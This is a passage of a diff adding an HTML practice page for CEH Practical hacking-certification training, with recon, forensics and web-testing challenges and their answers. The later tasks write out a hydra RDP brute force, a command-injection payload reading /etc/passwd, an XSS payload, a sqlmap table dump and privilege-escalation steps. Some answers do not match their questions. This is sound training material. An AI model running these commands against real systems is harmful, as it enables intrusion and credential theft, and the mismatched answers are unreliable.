@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH Practical Lab — 45 Challenges</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav>
+    <h1>[MISSION_CONTROL]</h1>
+    <div class="search-wrap">
+        <input id="globalSearch" type="text" placeholder="Search modules...">
+        <div id="searchResults"></div>
+    </div>
+    <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">&#9776;</button>
+    <ul id="navMenu">
+        <li><a href="index.html" id="nav-index">ROOT_ROADMAP</a></li>
+        <li><a href="module_02.html" id="nav-02">MOD_02_RECON</a></li>
+        <li><a href="module_03.html" id="nav-03">MOD_03_SCAN</a></li>
+        <li><a href="module_04.html" id="nav-04">MOD_04_ENUM</a></li>
+        <li><a href="module_05.html" id="nav-05">MOD_05_VULN</a></li>
+        <li><a href="module_06.html" id="nav-06">MOD_06_SYS</a></li>
+        <li><a href="module_07.html" id="nav-07">MOD_07_MAL</a></li>
+        <li><a href="module_08.html" id="nav-08">MOD_08_SNIFF</a></li>
+        <li><a href="module_09.html" id="nav-09">MOD_09_SE</a></li>
+        <li><a href="module_10.html" id="nav-10">MOD_10_DOS</a></li>
+        <li><a href="module_11.html" id="nav-11">MOD_11_SESS</a></li>
+        <li><a href="module_12.html" id="nav-12">MOD_12_EVADE</a></li>
+        <li><a href="module_13.html" id="nav-13">MOD_13_WEBSRV</a></li>
+        <li><a href="module_14.html" id="nav-14">MOD_14_WEBAPP</a></li>
+        <li><a href="module_15.html" id="nav-15">MOD_15_SQLI</a></li>
+        <li><a href="module_16.html" id="nav-16">MOD_16_WIRELESS</a></li>
+        <li><a href="module_17.html" id="nav-17">MOD_17_MOBILE</a></li>
+        <li><a href="module_18.html" id="nav-18">MOD_18_IOT</a></li>
+        <li><a href="module_19.html" id="nav-19">MOD_19_CLOUD</a></li>
+        <li><a href="module_20.html" id="nav-20">MOD_20_CRYPTO</a></li>
+        <li><a href="cheat_sheet.html" id="nav-cheat">CHEAT_SHEET</a></li>
+        <li><a href="practice.html" id="nav-practice">PRACTICE_LAB</a></li>
+        <li><a href="exam_checklist.html" id="nav-checklist">EXAM_CHECKLIST</a></li>
+    </ul>
+    <button id="viewToggle" class="view-toggle">COMPACT</button>
+    <button id="themeToggle" class="theme-toggle">SWITCH_MODE</button>
+</nav>
+<main class="content-body">
+    <div class="window">
+        <div class="module-header">
+            <span>CEH Practical Lab — Tutor Materials</span>
+            <h2>45 Hands-on Challenges</h2>
+        </div>
+        <p>Safety: run active scanning, web tests and password auditing ONLY against systems you own or are explicitly authorized to test. The 192.0.2.0/24 addresses are documentation placeholders.</p>
+        <p>Workflow: read question, run command, capture evidence, verify answer. Inputs are in student_inputs/ (from tutor zip).</p>
+        <button class="cs-toggle-all" onclick="toggleAllPractice(this)">Collapse all</button>
+        <input type="text" id="practiceSearch" placeholder="Filter tasks..." style="margin: 8px 0; padding: 6px 10px; width: 100%; max-width: 300px; border: 1px solid var(--border); border-radius: 6px; background: var(--bg); color: var(--text);">
+        <details style="margin:12px 0;"><summary style="cursor:pointer;color:var(--accent);font-weight:700;">Quick jump to tasks (45)</summary>
+        <div style="display:flex;flex-wrap:wrap;gap:4px;margin-top:8px;">
+            <a href="#task-1" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">1. Pattern 01 — Find live ho</a>
+            <a href="#task-2" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">2. Pattern 02 — Identify ope</a>
+            <a href="#task-3" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">3. Pattern 03 — Identify ser</a>
+            <a href="#task-4" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">4. Pattern 04 — Find DNS mai</a>
+            <a href="#task-5" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">5. Pattern 05 — Enumerate an</a>
+            <a href="#task-6" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">6. Pattern 06 — Map version </a>
+            <a href="#task-7" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">7. Pattern 07 — Find OS and </a>
+            <a href="#task-8" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">8. Pattern 08 — Find a hidde</a>
+            <a href="#task-9" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">9. Pattern 09 — Inspect HTTP</a>
+            <a href="#task-10" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">10. Pattern 10 — Investigate </a>
+            <a href="#task-11" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">11. Pattern 11 — Audit a prov</a>
+            <a href="#task-12" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">12. Pattern 12 — Decode a Bas</a>
+            <a href="#task-13" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">13. Pattern 13 — Identify a t</a>
+            <a href="#task-14" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">14. Pattern 14 — Read image m</a>
+            <a href="#task-15" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">15. Pattern 15 — Identify sou</a>
+            <a href="#task-16" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">16. Pattern 16 — Identify DNS</a>
+            <a href="#task-17" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">17. Pattern 17 — Verify file </a>
+            <a href="#task-18" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">18. Pattern 18 — Inspect wire</a>
+            <a href="#task-19" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">19. Pattern 19 — Identify clo</a>
+            <a href="#task-20" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">20. Pattern 20 — Identify And</a>
+            <a href="#task-21" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">21. Pattern BONUS — Hidden ZI</a>
+            <a href="#task-22" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">22. RDP Credential Cracking</a>
+            <a href="#task-23" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">23. Privilege Escalation (Lin</a>
+            <a href="#task-24" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">24. Image Steganography</a>
+            <a href="#task-25" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">25. ELF Binary Analysis</a>
+            <a href="#task-26" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">26. Command Injection</a>
+            <a href="#task-27" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">27. XSS Detection</a>
+            <a href="#task-28" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">28. SQL Injection - Data Extr</a>
+            <a href="#task-29" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">29. Parameter Tampering (IDOR</a>
+            <a href="#task-30" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">30. Brute Force Web Login</a>
+            <a href="#task-31" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">31. Banner Grabbing</a>
+            <a href="#task-32" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">32. CMS Identification</a>
+            <a href="#task-33" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">33. FTP Credential Cracking</a>
+            <a href="#task-34" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">34. Clickjacking Detection</a>
+            <a href="#task-35" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">35. Session Hijacking / ARP</a>
+            <a href="#task-36" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">36. DVWA File Upload</a>
+            <a href="#task-37" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">37. DVWA MD5 Hash Crack</a>
+            <a href="#task-38" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">38. DDoS PCAP Analysis</a>
+            <a href="#task-39" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">39. VeraCrypt Volume Crack</a>
+            <a href="#task-40" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">40. WiFi WPA Cracking</a>
+            <a href="#task-41" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">41. RAT Remote Access</a>
+            <a href="#task-42" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">42. IoT MQTT PCAP Analysis</a>
+            <a href="#task-43" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">43. Load Balancer Identificat</a>
+            <a href="#task-44" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">44. Web Crawling</a>
+            <a href="#task-45" style="font-size:0.75rem;padding:2px 8px;border:1px solid var(--border);border-radius:4px;text-decoration:none;color:var(--text);">45. Clickjacking Detection</a>
+        </div>
+        </details>
+
+        <div style="margin: 8px 0; font-size: 0.85rem; color: var(--muted);">Progress: <span id="practiceProgress">0</span> / <span id="practiceTotal">0</span> tasks checked</div>
+        <div class="lab-task" id="task-1"><h3>Module A — Reconnaissance & Enumeration</h3></div>
+        <div class="lab-task" id="task-2">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 01 — Find live hosts</h3>
+            <p><strong>Question:</strong> Which hosts in the authorized /28 training subnet respond to discovery?</p>
+            <p><strong>Input:</strong> authorized subnet (e.g. 192.168.56.0/28)</p>
+            <pre><code>ip -br addr
+nmap -sn 192.168.56.0/28 -oN evidence/hosts.txt</code></pre>
+            <details><summary>Show answer</summary><p>Record only responsive host addresses; discovery can be blocked by firewalls. Example: 192.168.56.10</p></details>
+        </div>
+        <div class="lab-task" id="task-3">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 02 — Identify open ports</h3>
+            <p><strong>Question:</strong> Find the open TCP ports on a lab host.</p>
+            <p><strong>Input:</strong> authorized VM at 192.168.56.10</p>
+            <pre><code>nmap -sT -p 21,22,80,443 192.168.56.10
+nmap -sT -p- 192.168.56.10 -oN evidence/ports.txt</code></pre>
+            <details><summary>Show answer</summary><p>Report TCP/UDP accurately; filtered != open. Example: 22, 80</p></details>
+        </div>
+        <div class="lab-task" id="task-4">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 03 — Identify service and version</h3>
+            <p><strong>Question:</strong> What FTP server version runs on port 21?</p>
+            <p><strong>Input:</strong> nmap_scan.txt (provided)</p>
+            <pre><code>nmap -sV -p 21 192.168.56.10</code></pre>
+            <details><summary>Show answer</summary><p>vsftpd 3.0.3</p></details>
+        </div>
+        <div class="lab-task" id="task-5">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 04 — Find DNS mail records</h3>
+            <p><strong>Question:</strong> What mail exchanger is configured for a sample domain?</p>
+            <p><strong>Input:</strong> domain explicitly supplied for DNS coursework</p>
+            <pre><code>dig example.com MX +noall +answer
+nslookup -type=mx example.com</code></pre>
+            <details><summary>Show answer</summary><p>mail.training.example (from dns.txt)</p></details>
+        </div>
+        <div class="lab-task" id="task-6">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 05 — Enumerate an SMB share</h3>
+            <p><strong>Question:</strong> Which SMB shares are visible to an explicitly allowed guest session?</p>
+            <p><strong>Input:</strong> training Windows/Samba VM</p>
+            <pre><code>nmap -p 445 192.168.56.10
+smbclient -L //192.168.56.10 -N</code></pre>
+            <details><summary>Show answer</summary><p>public, backups (from smb.txt)</p></details>
+        </div>
+        <div class="lab-task" id="task-7"><h3>Module B — Vulnerability assessment and systems</h3></div>
+        <div class="lab-task" id="task-8">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 06 — Map version to CVE</h3>
+            <p><strong>Question:</strong> Which published CVE relates to the identified product release?</p>
+            <p><strong>Input:</strong> instructor supplies advisory + service inventory</p>
+            <pre><code>nmap -sV -p 80 192.168.56.10
+curl -I http://192.168.56.10/</code></pre>
+            <details><summary>Show answer</summary><p>DemoPortal 1.3 is in affected range 1.0-1.4; verify configuration. CVE placeholder.</p></details>
+        </div>
+        <div class="lab-task" id="task-9">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 07 — Find OS and account information</h3>
+            <p><strong>Question:</strong> Which local accounts belong to the Administrators group?</p>
+            <p><strong>Input:</strong> Windows evaluation VM</p>
+            <pre><code>whoami
+systeminfo
+net localgroup Administrators</code></pre>
+            <details><summary>Show answer</summary><p>Administrator, LabAdmin (from windows.txt)</p></details>
+        </div>
+        <div class="lab-task" id="task-10"><h3>Module C — Web application testing</h3></div>
+        <div class="lab-task" id="task-11">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 08 — Find a hidden directory</h3>
+            <p><strong>Question:</strong> Which path returns HTTP 200?</p>
+            <p><strong>Input:</strong> local web app on port 8080</p>
+            <pre><code>curl -I http://127.0.0.1:8080/
+gobuster dir -u http://127.0.0.1:8080/ -w /usr/share/wordlists/dirb/common.txt
+curl -I http://127.0.0.1:8080/backup</code></pre>
+            <details><summary>Show answer</summary><p>/backup (Status: 200) (from gobuster.txt)</p></details>
+        </div>
+        <div class="lab-task" id="task-12">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 09 — Inspect HTTP cookies</h3>
+            <p><strong>Question:</strong> What cookie name is set by the training web app?</p>
+            <p><strong>Input:</strong> instructor starts local demo app</p>
+            <pre><code>curl -i http://127.0.0.1:8080/</code></pre>
+            <details><summary>Show answer</summary><p>session (Set-Cookie: session=DEMO123; HttpOnly)</p></details>
+        </div>
+        <div class="lab-task" id="task-13">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 10 — Investigate SQL injection indicators</h3>
+            <p><strong>Question:</strong> Which input parameter shows signs of SQL injection?</p>
+            <p><strong>Input:</strong> authorized vulnerable SQL endpoint</p>
+            <pre><code>sqlmap -u "http://127.0.0.1:8080/item?id=1" -p id --batch</code></pre>
+            <details><summary>Show answer</summary><p>id (from request.txt: GET /products?id=7)</p></details>
+        </div>
+        <div class="lab-task" id="task-14"><h3>Module D — Offline password and data exercises</h3></div>
+        <div class="lab-task" id="task-15">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 11 — Audit a provided hash</h3>
+            <p><strong>Question:</strong> Which candidate in the training wordlist matches the hash?</p>
+            <p><strong>Input:</strong> hash.txt + wordlist.txt (provided)</p>
+            <pre><code>echo -n Training123 | md5sum
+john --format=raw-md5 --wordlist=wordlist.txt hash.txt
+john --format=raw-md5 --show hash.txt</code></pre>
+            <details><summary>Show answer</summary><p>Training123 (hash: 9db3be4dd1f15f3d555e8a165c3f5de2)</p></details>
+        </div>
+        <div class="lab-task" id="task-16">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 12 — Decode a Base64 message</h3>
+            <p><strong>Question:</strong> Decode the supplied encoded challenge string.</p>
+            <p><strong>Input:</strong> base64.txt (provided)</p>
+            <pre><code>echo Q0VIX1BSQUNUSUNBTA== | base64 -d</code></pre>
+            <details><summary>Show answer</summary><p>CEH_PRACTICAL</p></details>
+        </div>
+        <div class="lab-task" id="task-17"><h3>Module E — Network and file forensics</h3></div>
+        <div class="lab-task" id="task-18">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 13 — Identify a true file type</h3>
+            <p><strong>Question:</strong> What file type is an evidence file despite its filename?</p>
+            <p><strong>Input:</strong> file_magic.bin (provided)</p>
+            <pre><code>file file_magic.bin
+xxd -l 32 file_magic.bin</code></pre>
+            <details><summary>Show answer</summary><p>PDF header (%PDF-1.4), FLAG{MAGIC_BYTES}; file is not a valid complete PDF</p></details>
+        </div>
+        <div class="lab-task" id="task-19">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 14 — Read image metadata</h3>
+            <p><strong>Question:</strong> What software or camera name appears in an image metadata field?</p>
+            <p><strong>Input:</strong> sample_image.jpg (provided)</p>
+            <pre><code>file sample_image.jpg
+exiftool sample_image.jpg
+exiftool -Software -Model sample_image.jpg</code></pre>
+            <details><summary>Show answer</summary><p>Image Size: 520x260 (from exiftool)</p></details>
+        </div>
+        <div class="lab-task" id="task-20">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 15 — Identify source IP in PCAP</h3>
+            <p><strong>Question:</strong> Which host sent the HTTP request to the training server?</p>
+            <p><strong>Input:</strong> dns_capture.pcap (provided)</p>
+            <pre><code>tshark -r dns_capture.pcap -Y http.request -T fields -e ip.src -e ip.dst -e http.request.method</code></pre>
+            <details><summary>Show answer</summary><p>training.example (DNS query in pcap)</p></details>
+        </div>
+        <div class="lab-task" id="task-21">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 16 — Identify DNS queries in PCAP</h3>
+            <p><strong>Question:</strong> Which domain did the client query?</p>
+            <p><strong>Input:</strong> dns_capture.pcap (provided)</p>
+            <pre><code>tshark -r dns_capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name</code></pre>
+            <details><summary>Show answer</summary><p>training.example</p></details>
+        </div>
+        <div class="lab-task" id="task-22">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 17 — Verify file hash integrity</h3>
+            <p><strong>Question:</strong> Does the received file match the given SHA-256 checksum?</p>
+            <p><strong>Input:</strong> instructor distributes test.txt + digest</p>
+            <pre><code>sha256sum test.txt</code></pre>
+            <details><summary>Show answer</summary><p>MATCH (compare 64 hex chars)</p></details>
+        </div>
+        <div class="lab-task" id="task-23"><h3>Module F — Wireless, cloud, mobile and IoT</h3></div>
+        <div class="lab-task" id="task-24">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 18 — Inspect wireless identifiers</h3>
+            <p><strong>Question:</strong> What SSID/BSSID appears in a provided wireless packet capture?</p>
+            <p><strong>Input:</strong> pre-recorded wireless traffic</p>
+            <pre><code>tshark -r wifi-demo.pcap -Y "wlan.fc.type_subtype == 0x08" -T fields -e wlan.ssid -e wlan.bssid</code></pre>
+            <details><summary>Show answer</summary><p>TrainingGuest / 02:AA:BB:CC:DD:EE / CH11 / WPA3 (from wireless.txt)</p></details>
+        </div>
+        <div class="lab-task" id="task-25">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 19 — Identify cloud identity and permissions</h3>
+            <p><strong>Question:</strong> Which test account identity is active, and can it list S3 buckets?</p>
+            <p><strong>Input:</strong> instructor-managed AWS training account</p>
+            <pre><code>aws sts get-caller-identity
+aws s3 ls</code></pre>
+            <details><summary>Show answer</summary><p>training-reader; bucket listing denied (from cloud.json: denied s3:PutObject, s3:DeleteObject)</p></details>
+        </div>
+        <div class="lab-task" id="task-26">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern 20 — Identify Android or IoT service details</h3>
+            <p><strong>Question:</strong> Which Android version is installed in the authorized emulator?</p>
+            <p><strong>Input:</strong> Android emulator with ADB / IoT device</p>
+            <pre><code>adb devices
+adb shell getprop ro.build.version.release
+# IoT alt: nmap -sV -p 1883 192.168.56.30</code></pre>
+            <details><summary>Show answer</summary><p>Android 13 (from android.txt); IoT: classroom/temperature, TCP 1883 (from iot.txt)</p></details>
+        </div>
+        <div class="lab-task" id="task-27">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Pattern BONUS — Hidden ZIP in embedded archive</h3>
+            <p><strong>Question:</strong> Find ZIP hidden in embedded_archive.bin.</p>
+            <p><strong>Input:</strong> embedded_archive.bin (provided)</p>
+            <pre><code>binwalk embedded_archive.bin
+binwalk -e embedded_archive.bin</code></pre>
+            <details><summary>Show answer</summary><p>FLAG{EMBEDDED_ZIP_FOUND} (secret.txt at offset 0x72)</p></details>
+        </div>
+    </div>
+
+    <div class="window">
+        <div class="module-header"><span>Local Web Lab</span><h2>Practice Server</h2></div>
+        <p>Run the tutor-provided local web app for patterns 08-10:</p>
+        <pre><code>python3 local_web_lab/server.py   # 127.0.0.1:8080
+gobuster dir -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirb/common.txt
+curl -i http://127.0.0.1:8080/</code></pre>
+    </div>
+
+    <div class="window">
+        <div class="module-header"><span>Quick Command Bank</span><h2>Reference</h2></div>
+        <pre><code>Scanning: nmap -sn SUBNET; nmap -sV -p PORT IP; nmap -sC -sV IP; nmap -oN OUT IP; sudo nmap -sU -p 53,161 IP
+DNS: dig DOMAIN MX; dig DOMAIN TXT; dig DOMAIN NS; nslookup DOMAIN
+Web: curl -I URL; curl -i URL; whatweb URL; gobuster dir -u URL -w WORDLIST; nikto -h URL
+Host: whoami; id; uname -a; ip addr; ss -tuln; systeminfo; net user; net localgroup Administrators
+Forensics: file FILE; strings FILE; xxd FILE; exiftool FILE; binwalk FILE; sha256sum FILE; tshark -r CAPTURE -Y dns
+Data: echo -n TEXT | base64; echo BASE64 | base64 -d; echo -n TEXT | sha256sum; xxd -r -p hex.txt
+</code></pre>
+    </div>
+
+
+
+    <div class="window">
+        <div class="module-header"><span>Exam-Style Challenges (Original)</span><h2>Advanced Patterns</h2></div>
+        <p>Original practice challenges inspired by CEH Practical exam structure. Different targets and values from the actual exam. Tests the same skills and tools.</p>
+        <div class="lab-task" id="task-28">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">RDP Credential Cracking <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Medium · 15min]</span></h3>
+            <p><strong>Scenario:</strong> A Windows machine on the 10.10.50.0/24 subnet has RDP enabled. Crack the password for user &#x27;jsmith&#x27; and read the file secret.txt on the desktop. Tools: hydra, xfreerdp.</p>
+            <pre><code>hydra -l jsmith -P /usr/share/wordlists/rockyou.txt rdp://10.10.50.10
+xfreerdp /u:jsmith /p:password123 /v:10.10.50.10</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: use hydra with -t 4 (threads) and -V (verbose). Answer format: the password string.</p></details>
+        </div>
+        <div class="lab-task" id="task-29">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Privilege Escalation (Linux) <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Hard · 25min]</span></h3>
+            <p><strong>Scenario:</strong> SSH into a Linux box as user &#x27;dev&#x27; (password: dev123). Escalate to root and read /root/flag.txt. Check sudo -l, SUID binaries, and cron jobs.</p>
+            <pre><code>ssh dev@10.10.50.20
+sudo -l
+find / -perm -4000 2&gt;/dev/null
+linpeas.sh</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: look for sudo NOPASSWD, SUID on /usr/bin/find or /usr/bin/vim, writable cron scripts. Answer: contents of /root/flag.txt.</p></details>
+        </div>
+        <div class="lab-task" id="task-30">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Image Steganography <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Easy · 10min]</span></h3>
+            <p><strong>Scenario:</strong> An image file &#x27;vacation.jpg&#x27; contains hidden data. Extract it using steghide with password &#x27;sunshine&#x27;.</p>
+            <pre><code>steghide extract -sf vacation.jpg -p sunshine
+# or: stegseek vacation.jpg /usr/share/wordlists/rockyou.txt</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: steghide info vacation.jpg first (shows if data is embedded). Answer: the extracted text/file.</p></details>
+        </div>
+        <div class="lab-task" id="task-31">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">ELF Binary Analysis <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Medium · 15min]</span></h3>
+            <p><strong>Scenario:</strong> Analyze the ELF binary &#x27;suspicious_elf&#x27; and find the PT_LOAD(0) segment size. Use readelf or objdump.</p>
+            <pre><code>file suspicious_elf
+readelf -l suspicious_elf | grep -A2 &#x27;LOAD&#x27;
+# or: objdump -x suspicious_elf | grep -i load</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: readelf -l shows program headers. PT_LOAD(0) is the first LOAD segment. Size is in hex (e.g., 0x000c54ec).</p></details>
+        </div>
+        <div class="lab-task" id="task-32">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Command Injection <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Medium · 15min]</span></h3>
+            <p><strong>Scenario:</strong> A web app at http://10.10.50.30/cmd.php accepts a &#x27;host&#x27; parameter. Test for OS command injection and list the /etc/passwd file.</p>
+            <pre><code>curl &#x27;http://10.10.50.30/cmd.php?host=127.0.0.1;cat+/etc/passwd&#x27;
+# or: ; id ; whoami ; ls</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: try ; | &amp;&amp; || and URL-encoded versions (%3B). Answer: number of user accounts or specific username.</p></details>
+        </div>
+        <div class="lab-task" id="task-33">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">XSS Detection <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Easy · 10min]</span></h3>
+            <p><strong>Scenario:</strong> Test http://10.10.50.30/search.php?q=test for reflected XSS. Submit a payload and check if it executes.</p>
+            <pre><code>curl &#x27;http://10.10.50.30/search.php?q=&lt;script&gt;alert(1)&lt;/script&gt;&#x27;
+# Check if payload appears unescaped in response</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: look for the payload reflected in the HTML without encoding. Answer: Yes/No (vulnerable or not).</p></details>
+        </div>
+        <div class="lab-task" id="task-34">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">SQL Injection - Data Extraction <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Hard · 25min]</span></h3>
+            <p><strong>Scenario:</strong> SQLi on http://10.10.50.30/login.php. Login as &#x27;admin&#x27; and extract all usernames from the &#x27;users&#x27; table.</p>
+            <pre><code>sqlmap -u &#x27;http://10.10.50.30/login.php&#x27; --data=&#x27;user=admin&amp;pass=test&#x27; --dbs
+sqlmap -u &#x27;http://10.10.50.30/login.php&#x27; --data=&#x27;user=admin&amp;pass=test&#x27; -D dbname --tables
+sqlmap -u &#x27;http://10.10.50.30/login.php&#x27; --data=&#x27;user=admin&amp;pass=test&#x27; -D dbname -T users --dump</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: use --batch for non-interactive. Answer: number of users or specific username/password.</p></details>
+        </div>
+        <div class="lab-task" id="task-35">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Parameter Tampering (IDOR) <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Easy · 10min]</span></h3>
